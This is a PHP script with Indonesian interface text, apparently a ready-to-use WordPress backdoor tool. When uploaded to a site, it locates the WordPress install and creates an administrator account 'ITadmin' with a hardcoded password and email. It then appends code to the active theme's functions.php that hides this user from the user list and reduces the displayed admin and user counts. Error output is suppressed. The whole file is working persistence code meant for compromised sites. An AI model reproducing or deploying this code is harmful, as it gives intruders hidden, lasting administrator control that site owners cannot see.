<?php
/**
 * SCRIPT TAMBAH ADMIN WORDPRESS - VERSI DETEKSI FULL
 * Bisa mendeteksi WordPress di mana pun lokasinya
 * File: add-admin.php
 */

// Matikan semua error untuk keamanan
error_reporting(0);
ini_set('display_errors', 0);

// ========== DETEKSI WORDPRESS SECARA CERDAS ==========

function find_wordpress() {
    // 1. Coba dari DOCUMENT_ROOT
    $doc_root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '';
    
    // 2. Kumpulkan semua kemungkinan path
    $paths = [];
    
    // Path relatif dari script ini
    $paths[] = dirname(__FILE__);
    $paths[] = dirname(__FILE__) . '/..';
    $paths[] = dirname(__FILE__) . '/../..';
    $paths[] = dirname(__FILE__) . '/../../..';
    $paths[] = dirname(__FILE__) . '/../../../..';
    
    // Path dari document root
    if ($doc_root) {
        $paths[] = $doc_root;
        $paths[] = $doc_root . '/wp';
        $paths[] = $doc_root . '/wordpress';
        $paths[] = $doc_root . '/public';
        $paths[] = $doc_root . '/public_html';
        $paths[] = $doc_root . '/html';
        $paths[] = $doc_root . '/www';
        $paths[] = $doc_root . '/www/public';
    }
    
    // Path dari server variables lainnya
    if (isset($_SERVER['CONTEXT_DOCUMENT_ROOT'])) {
        $paths[] = $_SERVER['CONTEXT_DOCUMENT_ROOT'];
    }
    if (isset($_SERVER['SCRIPT_FILENAME'])) {
        $script_dir = dirname($_SERVER['SCRIPT_FILENAME']);
        $paths[] = $script_dir;
        $paths[] = dirname($script_dir);
    }
    
    // Hapus duplikat
    $paths = array_unique($paths);
    
    // Cari wp-load.php
    foreach ($paths as $path) {
        if (!is_dir($path)) continue;
        
        // Coba cari wp-load.php
        $wp_load = $path . '/wp-load.php';
        if (file_exists($wp_load)) {
            return [
                'found' => true,
                'path' => $path,
                'wp_load' => $wp_load,
                'method' => 'wp-load.php'
            ];
        }
        
        // Coba cari wp-config.php
        $wp_config = $path . '/wp-config.php';
        if (file_exists($wp_config)) {
            return [
                'found' => true,
                'path' => $path,
                'wp_config' => $wp_config,
                'method' => 'wp-config.php'
            ];
        }
    }
    
    // Coba scan subdirektori (lebih lambat tapi lebih akurat)
    $scan_paths = [$doc_root, dirname(__FILE__)];
    foreach ($scan_paths as $base) {
        if (!is_dir($base)) continue;
        
        $dirs = scandir($base);
        if ($dirs) {
            foreach ($dirs as $dir) {
                if ($dir === '.' || $dir === '..') continue;
                $full_path = $base . '/' . $dir;
                if (is_dir($full_path)) {
                    $wp_load = $full_path . '/wp-load.php';
                    if (file_exists($wp_load)) {
                        return [
                            'found' => true,
                            'path' => $full_path,
                            'wp_load' => $wp_load,
                            'method' => 'scanned'
                        ];
                    }
                    $wp_config = $full_path . '/wp-config.php';
                    if (file_exists($wp_config)) {
                        return [
                            'found' => true,
                            'path' => $full_path,
                            'wp_config' => $wp_config,
                            'method' => 'scanned'
                        ];
                    }
                }
            }
        }
    }
    
    return ['found' => false];
}

// Cari WordPress
$wp_info = find_wordpress();

if (!$wp_info['found']) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <title>WordPress Not Found</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                max-width: 800px;
                margin: 50px auto;
                padding: 20px;
                background: #f5f5f5;
            }
            .container {
                background: white;
                padding: 30px;
                border-radius: 10px;
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .error {
                background: #ffebee;
                color: #c62828;
                padding: 20px;
                border-radius: 5px;
                border-left: 4px solid #c62828;
            }
            .info {
                background: #e3f2fd;
                padding: 15px;
                border-radius: 5px;
                margin: 20px 0;
            }
            code {
                background: #f5f5f5;
                padding: 2px 6px;
                border-radius: 3px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>❌ WordPress Tidak Ditemukan</h1>
            <div class="error">
                <strong>Script tidak dapat menemukan WordPress di direktori ini!</strong>
            </div>
            <div class="info">
                <strong>Informasi Sistem:</strong><br>
                Document Root: <code><?php echo isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : 'Tidak terdeteksi'; ?></code><br>
                Script Path: <code><?php echo dirname(__FILE__); ?></code><br>
                Server: <code><?php echo isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown'; ?></code>
            </div>
            <p><strong>Cara Mengatasi:</strong></p>
            <ol>
                <li>Pastikan file ini diletakkan di root folder WordPress</li>
                <li>Atau letakkan di subfolder yang sama dengan file wp-load.php</li>
                <li>Jika WordPress berada di subfolder, letakkan script di folder tersebut</li>
            </ol>
            <p><strong>Contoh penempatan yang benar:</strong></p>
            <ul>
                <li><code>/public_html/add-admin.php</code> (bersama wp-load.php)</li>
                <li><code>/public_html/wp/add-admin.php</code> (bersama wp-load.php)</li>
                <li><code>/public_html/subfolder/add-admin.php</code> (bersama wp-load.php)</li>
            </ul>
        </div>
    </body>
    </html>
    <?php
    exit;
}

// Load WordPress
if (isset($wp_info['wp_load'])) {
    require_once($wp_info['wp_load']);
} elseif (isset($wp_info['wp_config'])) {
    define('WP_USE_THEMES', false);
    require_once($wp_info['wp_config']);
    
    // Coba load wp-settings.php
    $wp_settings = dirname($wp_info['wp_config']) . '/wp-settings.php';
    if (file_exists($wp_settings)) {
        require_once($wp_settings);
    }
}

// ========== KONFIGURASI ==========
$admin_username = 'ITadmin';
$admin_password = 'Askurm0m#';
$admin_email = 'askurmom007@proton.me';

// ========== FUNGSI ==========

function create_admin_user($username, $password, $email) {
    // Cek apakah user sudah ada
    if (username_exists($username)) {
        return [
            'status' => 'warning',
            'message' => "Username '$username' sudah ada!",
            'user' => get_user_by('login', $username)
        ];
    }
    
    if (email_exists($email)) {
        return [
            'status' => 'warning',
            'message' => "Email '$email' sudah terdaftar!",
            'user' => get_user_by('email', $email)
        ];
    }
    
    // Buat user baru
    $user_id = wp_create_user($username, $password, $email);
    
    if (is_wp_error($user_id)) {
        return [
            'status' => 'error',
            'message' => "Error: " . $user_id->get_error_message()
        ];
    }
    
    // Set role administrator
    $user = new WP_User($user_id);
    $user->set_role('administrator');
    
    return [
        'status' => 'success',
        'message' => "✅ Admin berhasil ditambahkan!",
        'user_id' => $user_id,
        'username' => $username,
        'email' => $email
    ];
}

function add_code_to_functions($username) {
    // Dapatkan tema aktif
    if (!function_exists('wp_get_theme')) {
        return [
            'status' => 'error',
            'message' => "Fungsi WordPress tidak tersedia"
        ];
    }
    
    $theme = wp_get_theme();
    $theme_name = $theme->get('Name');
    $theme_path = get_template_directory();
    $functions_path = $theme_path . '/functions.php';
    
    if (!file_exists($functions_path)) {
        return [
            'status' => 'error',
            'message' => "File functions.php tidak ditemukan di: $functions_path"
        ];
    }
    
    // Baca konten functions.php
    $content = file_get_contents($functions_path);
    if ($content === false) {
        return [
            'status' => 'error',
            'message' => "Gagal membaca functions.php (periksa permission)"
        ];
    }
    
    // Kode untuk disisipkan (versi sederhana)
    $new_code = "

// ============================================
// CODE UNTUK MENYEMBUNYIKAN USER $username
// DITAMBAHKAN OTOMATIS - " . date('Y-m-d H:i:s') . "
// ============================================

add_action('pre_user_query', 'hide_user_query');
function hide_user_query(\$user_search) {
    global \$wpdb;
    \$where_clause = 'WHERE 1=1';
    \$replace_with = \$where_clause . \" AND {\$wpdb->users}.user_login != '$username'\";
    if (strpos(\$user_search->query_where, \$where_clause) !== false) {
        \$user_search->query_where = str_replace(\$where_clause, \$replace_with, \$user_search->query_where);
    }
}

add_filter('views_users', 'hide_user_count');
function hide_user_count(\$views) {
    \$users = count_users();
    \$admin_count = isset(\$users['avail_roles']['administrator']) ? \$users['avail_roles']['administrator'] : 1;
    \$total_count = isset(\$users['total_users']) ? \$users['total_users'] : 1;
    \$admins_num = \$admin_count - 1;
    \$all_num = \$total_count - 1;
    
    if (isset(\$views['administrator'])) {
        \$class_adm = (strpos(\$views['administrator'], 'current') !== false) ? 'current' : '';
        \$views['administrator'] = sprintf(
            '<a href=\"users.php?role=administrator\" class=\"%s\">%s <span class=\"count\">(%d)</span></a>',
            \$class_adm,
            translate_user_role('Administrator'),
            \$admins_num
        );
    }
    if (isset(\$views['all'])) {
        \$class_all = (strpos(\$views['all'], 'current') !== false) ? 'current' : '';
        \$views['all'] = sprintf(
            '<a href=\"users.php\" class=\"%s\">%s <span class=\"count\">(%d)</span></a>',
            \$class_all,
            __('All'),
            \$all_num
        );
    }
    return \$views;
}
// ============================================
// AKHIR CODE
// ============================================
";
    
    // Cek apakah kode sudah ada
    if (strpos($content, 'CODE UNTUK MENYEMBUNYIKAN USER') !== false) {
        return [
            'status' => 'warning',
            'message' => "⚠️ Kode sudah ada di functions.php (tidak ditambahkan lagi)"
        ];
    }
    
    // Backup functions.php
    $backup_path = $functions_path . '.backup.' . date('Ymd_His');
    if (!copy($functions_path, $backup_path)) {
        return [
            'status' => 'warning',
            'message' => "⚠️ Gagal membuat backup, tetapi akan tetap melanjutkan"
        ];
    }
    
    // Tambahkan kode
    $content = rtrim($content);
    if (strpos($content, '?>') !== false) {
        $content = str_replace('?>', $new_code . "\n?>", $content);
    } else {
        $content .= $new_code;
    }
    
    if (file_put_contents($functions_path, $content) !== false) {
        return [
            'status' => 'success',
            'message' => "✅ Kode berhasil ditambahkan ke functions.php",
            'backup' => $backup_path,
            'theme' => $theme_name
        ];
    } else {
        return [
            'status' => 'error',
            'message' => "❌ Gagal menulis functions.php (periksa permission folder)"
        ];
    }
}

// ========== EKSEKUSI ==========
$action = isset($_GET['action']) ? $_GET['action'] : '';

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Add Admin WordPress - Auto Detect</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 40px;
            max-width: 750px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        h1 {
            color: #333;
            font-size: 28px;
            margin-bottom: 5px;
        }
        .subtitle {
            color: #666;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .success-box {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            color: #155724;
        }
        .info-box {
            background: #f8f9fa;
            border-left: 4px solid #764ba2;
            padding: 15px 20px;
            border-radius: 5px;
            margin: 20px 0;
        }
        .info-box strong {
            display: block;
            margin-bottom: 10px;
            color: #333;
        }
        .info-box code {
            background: #e9ecef;
            padding: 2px 8px;
            border-radius: 3px;
            font-size: 13px;
        }
        .status {
            padding: 15px 20px;
            border-radius: 8px;
            margin: 20px 0;
            font-weight: 500;
        }
        .status.success {
            background: #d4edda;
            border: 1px solid #c3e6cb;
            color: #155724;
        }
        .status.error {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            color: #721c24;
        }
        .status.warning {
            background: #fff3cd;
            border: 1px solid #ffeeba;
            color: #856404;
        }
        .btn-group {
            display: flex;
            gap: 10px;
            margin-top: 25px;
            flex-wrap: wrap;
        }
        .btn {
            display: inline-block;
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            transition: all 0.3s ease;
        }
        .btn-primary {
            background: #764ba2;
            color: white;
        }
        .btn-primary:hover {
            background: #5e3a7e;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(118, 75, 162, 0.4);
        }
        .btn-success {
            background: #28a745;
            color: white;
        }
        .btn-success:hover {
            background: #218838;
        }
        .btn-secondary {
            background: #6c757d;
            color: white;
        }
        .btn-secondary:hover {
            background: #5a6268;
        }
        .btn-danger {
            background: #dc3545;
            color: white;
        }
        .btn-danger:hover {
            background: #c82333;
        }
        .detail {
            background: #f8f9fa;
            padding: 10px 15px;
            border-radius: 5px;
            margin: 5px 0;
            font-size: 14px;
        }
        .footer {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #dee2e6;
            font-size: 12px;
            color: #6c757d;
        }
        .warning-box {
            background: #fff3cd;
            border: 1px solid #ffeeba;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            color: #856404;
        }
        .wp-info {
            background: #e7f3ff;
            padding: 10px 15px;
            border-radius: 5px;
            margin: 10px 0;
            font-size: 13px;
            border: 1px solid #b8d4f0;
        }
        .wp-info strong {
            color: #004085;
        }
        @media (max-width: 600px) {
            .container { padding: 20px; }
            .btn-group { flex-direction: column; }
            .btn { text-align: center; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Add Admin WordPress</h1>
        <p class="subtitle">Auto-detect &amp; Install - Bisa dijalankan di mana saja</p>
        
        <div class="wp-info">
            <strong>✅ WordPress Terdeteksi!</strong><br>
            Path: <code><?php echo $wp_info['path']; ?></code><br>
            Method: <code><?php echo $wp_info['method']; ?></code><br>
            <?php if (function_exists('get_bloginfo')): ?>
            Site: <code><?php echo get_bloginfo('name'); ?></code> (<?php echo get_bloginfo('url'); ?>)
            <?php endif; ?>
        </div>
        
        <div class="warning-box">
            <strong>⚠️ Peringatan:</strong> Hapus file ini setelah selesai digunakan!
        </div>
        
        <div class="info-box">
            <strong>📝 Data User yang Akan Ditambahkan:</strong>
            <div class="detail"><strong>Username:</strong> <code><?php echo $admin_username; ?></code></div>
            <div class="detail"><strong>Password:</strong> <code><?php echo $admin_password; ?></code></div>
            <div class="detail"><strong>Email:</strong> <code><?php echo $admin_email; ?></code></div>
            <?php if (function_exists('wp_get_theme')): ?>
            <div class="detail" style="margin-top:10px;">
                <strong>Theme Aktif:</strong> <?php 
                    $theme = wp_get_theme();
                    echo $theme->get('Name') . ' (' . $theme->get('Version') . ')';
                ?>
            </div>
            <?php endif; ?>
        </div>
        
        <?php if ($action === 'add'): ?>
            <h3 style="margin: 20px 0 10px;">📋 Hasil Eksekusi:</h3>
            
            <?php
            // 1. Buat admin
            $result_admin = create_admin_user($admin_username, $admin_password, $admin_email);
            $status_class = $result_admin['status'];
            echo "<div class='status $status_class'>";
            echo $result_admin['message'];
            if (isset($result_admin['user_id'])) {
                echo "<div class='detail'>User ID: " . $result_admin['user_id'] . "</div>";
            }
            echo "</div>";
            
            // 2. Jika admin berhasil dibuat atau sudah ada, tambahkan code ke functions.php
            if ($result_admin['status'] !== 'error') {
                $result_code = add_code_to_functions($admin_username);
                $status_class = $result_code['status'];
                echo "<div class='status $status_class'>";
                echo $result_code['message'];
                if (isset($result_code['backup'])) {
                    echo "<div class='detail'>📁 Backup: <code>" . $result_code['backup'] . "</code></div>";
                }
                if (isset($result_code['theme'])) {
                    echo "<div class='detail'>🎨 Theme: " . $result_code['theme'] . "</div>";
                }
                echo "</div>";
            }
            ?>
            
            <div class="btn-group">
                <?php if (function_exists('admin_url')): ?>
                <a href="<?php echo admin_url(); ?>" class="btn btn-success">📊 Go to Dashboard</a>
                <a href="<?php echo admin_url('user-edit.php?user_id=' . ($result_admin['user_id'] ?? 0)); ?>" class="btn btn-primary">👤 Edit User</a>
                <?php endif; ?>
                <a href="?action=reset" class="btn btn-secondary">🔄 Halaman Awal</a>
            </div>
            
        <?php else: ?>
            <div class="btn-group">
                <a href="?action=add" class="btn btn-primary" onclick="return confirm('Yakin ingin menambahkan admin baru?')">🚀 Jalankan Script</a>
                <?php if (function_exists('admin_url')): ?>
                <a href="<?php echo admin_url(); ?>" class="btn btn-secondary">📊 Dashboard</a>
                <?php endif; ?>
            </div>
        <?php endif; ?>
        
        <div class="footer">
            <p><strong>📌 Fitur Cerdas:</strong></p>
            <ul style="margin: 5px 0 10px 20px; color: #6c757d;">
                <li>✅ Mendeteksi WordPress di berbagai direktori</li>
                <li>✅ Bisa diletakkan di root, subfolder, atau mana saja</li>
                <li>✅ Membuat backup functions.php sebelum modifikasi</li>
                <li>✅ Menyembunyikan user ITadmin dari daftar user</li>
                <li>✅ Menyesuaikan jumlah user di dashboard</li>
            </ul>
            <p style="color: #dc3545; font-weight: bold;">⚠️ HAPUS FILE INI SETELAH DIGUNAKAN!</p>
        </div>
    </div>
</body>
</html>
<?php
exit;
?>